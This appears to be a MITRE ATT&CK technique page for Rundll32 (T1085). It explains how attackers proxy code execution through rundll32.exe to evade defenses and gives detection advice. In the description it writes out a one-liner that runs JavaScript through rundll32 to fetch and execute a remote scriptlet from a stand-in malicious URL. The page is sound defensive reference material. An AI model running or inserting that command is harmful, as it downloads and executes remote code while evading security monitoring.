---
contributors:
- Ricardo Dias
- Casey Smith
id: attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5
mitre_attack_url: https://attack.mitre.org/techniques/T1085
name: Rundll32
platforms:
- Windows
tactics:
- defense-evasion
- execution
title: defense-evasion - Rundll32
---

## Technical Details

| Attribute | Details |
|-----------|----------|
| **Tactics** | defense-evasion, execution |
| **Platforms** | Windows |
| **Permissions Required** | User |
| **MITRE ATT&CK URL** | [https://attack.mitre.org/techniques/T1085](https://attack.mitre.org/techniques/T1085) |

# Rundll32 (attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5)

## Description
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

## Detection
Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.

## External References
- [mitre-attack](https://attack.mitre.org/techniques/T1085)
- [Trend Micro CPL](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)
- [This is Security Command Line Confusion](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)
